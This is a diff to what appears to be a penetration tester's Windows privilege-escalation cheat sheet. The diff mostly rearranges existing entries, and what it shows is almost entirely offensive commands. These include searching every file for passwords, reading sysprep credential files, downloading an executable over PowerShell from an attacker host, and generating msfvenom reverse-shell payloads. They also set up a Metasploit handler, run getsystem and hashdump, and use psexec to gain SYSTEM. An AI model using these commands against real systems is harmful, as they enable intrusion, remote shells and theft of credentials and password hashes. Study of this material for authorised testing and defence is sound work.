@@ -105,10 +105,8 @@ findstr /si password *.ini*
     *$dir /s *pass* == *cred* == *vnc* == *.config**
 
     Find all passwords in all files.
-    *$findstr /spin "password" *.*
-findstr /spin "password" *.*
-In Files*
-
+    *$ findstr /spin "password" *.**
+    *$ findstr /spin "password" *.**
     These are common files to find them in. They might be base64-encoded. So look out for that.
     *$ type c:\sysprep.inf
 type c:\sysprep\sysprep.xml
@@ -158,14 +156,6 @@ portfwd add -l 3306 -p 3306 -r 192.168.1.101*
 
     Compile windows exploit in linux:
     *$ i686-w64-mingw32-gcc 18176.c -lws2_32 -o 18176.exe*
-
-Metasploit
-    Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions
-    *$ exploit/windows/local/service_permissions*
-    Other scripts
-    *https://github.com/GDSSecurity/Windows-Exploit-Suggester
-https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe*
-
 
 EoP6: Kernel exploits
     Find installed paths:
@@ -288,26 +278,34 @@ LIST*
     *$ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://YOURIP:8000/b.exe','C:\Users\YOURUSER\Desktop\b.exe')"*
 
 Metasploit
+    Module to elevate privileges to SYSTEM by creating a service or hijacking existing ones with incorrect permissions
+    *$ exploit/windows/local/service_permissions*
+    Other scripts
+    *https://github.com/GDSSecurity/Windows-Exploit-Suggester
+https://github.com/Jean13/Penetration_Testing/blob/master/Privilege_Escalation/windows-privesc-check2.exe*
+
+    Generate php reverse shell:
     *msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.123 -o meterpreter.php
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
-Generate php reverse shell:
-msfvenom -p generic/shell_reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f php -o shell.php
-Generate shellcode to use within a perl exploit:
-msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.123 LPORT=443 -f perl -b \x00\x0A\x0D\xFF
-Raw paylaod:
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f raw -o test.bin
-Handling reverse shell using meterpreter:
-msf > use exploit/multi/handler
+msfvenom -p generic/shell_reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f php -o shell.php*
+    Others
+    *$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp*
+    Generate shellcode to use within a perl exploit:
+    *msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.0.123 LPORT=443 -f perl -b \x00\x0A\x0D\xFF*
+    Raw paylaod:
+    *msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.0.123 LPORT=4444 -f raw -o test.bin*
+    Handling reverse shell using meterpreter:
+    *msf > use exploit/multi/handler
 msf > set lport 1234
 msf > set lhost 10.11.0.123
-msf > set payload windows/shell/reverse_tcp
-or
-set PAYLOAD windows/meterpreter/reverse_tcp
-or
-set PAYLOAD linux/x86/meterpreter/reverse_tcp
-msf > run*
-> hashdump
+msf > set payload windows/shell/reverse_tcp*
+msf > run
+    Other payloads:
+    *set PAYLOAD windows/meterpreter/reverse_tcp
+set PAYLOAD linux/x86/meterpreter/reverse_tcp*
+    Privilege escalation
+    *getsystem
+hashdump*
 
 From admin to system
     *psexec.exe -i -s %SystemRoot%\system32\cmd.exe*
@@ -319,7 +317,7 @@ AV bypass
 Get proof
     *$ echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"*
 
-    Access Check
+Access Check
     You will probably need to accept the eula first:
     *$ accesschk.exe /accepteula*
 
